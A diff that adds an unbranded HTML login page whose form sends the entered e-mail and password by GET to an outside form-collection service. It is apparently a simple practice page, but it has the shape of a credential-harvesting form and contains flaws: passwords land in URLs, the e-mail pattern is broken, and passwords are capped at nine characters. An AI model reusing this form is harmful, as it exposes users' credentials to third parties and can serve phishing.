@@ -1,1 +1,20 @@
-# login-page
+<!DOCTYPE html>
+
+<html>
+<head>
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+  <title>LOGIN TO YOUR ACCOUNT</title>
+</head>
+<body>
+  <h2>Login In to your Account</h2>
+  <form method="get" action="https://formspree.io/f/mreabqwq">
+    <label for="E_mail"><b>E-MAIL</b></label><br>
+  <input id="email" type="text" name="email" placeholder="@peter122okeke.gmail.com" pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z] {2,}$"required>
+  <br>
+  <label for="password"><b>Password</b></label><br>
+  <input id="password" name="password" type="password" minlength="5" maxlength="9">
+    <br><br>
+    <input type="submit" value="DONE">
+  </form>
+</body>
+</html>
